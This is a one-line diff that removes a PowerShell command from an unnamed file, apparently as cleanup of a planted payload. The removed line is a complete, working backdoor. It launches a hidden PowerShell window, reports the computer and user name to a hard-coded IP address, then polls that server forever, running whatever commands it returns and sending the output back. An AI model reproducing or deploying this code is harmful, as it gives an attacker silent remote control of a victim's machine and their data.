@@ -1,1 +1,1 @@
-Start-Process $PSHOME\powershell.exe -ArgumentList {$p='http://';$s='68.219.93.18:8080';$i='b4b7f91f-9475e358-14b04ed3';$v=Invoke-RestMethod -UseBasicParsing -Uri $p$s/b4b7f91f/$env:COMPUTERNAME/$env:USERNAME -Headers @{"Authorization"=$i};for (;;){$c=(Invoke-RestMethod -UseBasicParsing -Uri $p$s/9475e358 -Headers @{"Authorization"=$i});if ($c -ne 'None') {$r=Invoke-Expression $c -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$x=Invoke-RestMethod -Uri $p$s/14b04ed3 -Method POST -Headers @{"Authorization"=$i} -Body ($e+$r)} sleep 0.8}} -WindowStyle Hidden
+
